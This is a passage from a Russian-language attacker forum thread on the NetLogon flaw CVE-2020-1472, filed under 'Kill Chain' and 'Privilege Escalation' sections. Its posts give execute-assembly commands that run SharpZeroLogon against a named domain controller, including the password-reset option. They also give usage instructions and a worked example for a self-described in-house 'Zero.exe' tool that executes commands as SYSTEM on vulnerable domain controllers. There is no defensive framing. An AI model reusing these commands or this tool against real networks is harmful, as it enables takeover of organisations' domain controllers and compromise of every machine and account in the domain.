@@ -1,0 +1,113 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    NetLogon (CVE-2020-1472)
+
+NetLogon (CVE-2020-1472)
+Alter · 3 · 42
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 11:48:52 am
+Записан
+
+Post
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Июля 01, 2021, 03:20:14 am
+Записан
+
+
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local -reset
+execute-assembly /home/user/soft/scripts/SharpZeroLogon.exe CTT-DC02.cttexas.local -patch
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #2 : Июля 01, 2021, 03:42:54 am
+Записан
+
+Zero.exe нашей разработки ::
+
+Цитировать
+
+    USAGE: ZERO.EXE IP DC DOMAIN ADMIN_USERNAME [-c] COMMAND [-remote]:
+    ---------------------------------------------
+    where:
+    IP - ip address of domain controller
+    DC - domain controller name
+    DOMAIN - domain name, e.g. home.local
+    ADMIN_USERNAME - account name of the administrator. can be default <Administrator> or something else
+    -c - optional, use it when command is not binary executable itself
+    COMMAND - command that will be executed on domain controller. should be surrounded by quotes
+    -remote - if target is outside of current subnet
+
+
+    or
+
+    ZERO.EXE -test IP DC
+    to test if the target is vulnurable only
+
+
+    Выполнение кода на ДК уязвимой ЗероЛогон:
+    zero.exe 192.168.22.5 CCGPDC cccnetwork.com Administrator -c "whoami > C:\ProgramData\loggg5.txt"
+
+
+    192.168.22.5 - ипак ПДК
+    GCCPDC - hostname PDC
+    cccnetwork.com - domain
+    Administrator - Любой ДА
+    -c > команда которая выполняется от системы
+
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    NetLogon (CVE-2020-1472)
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
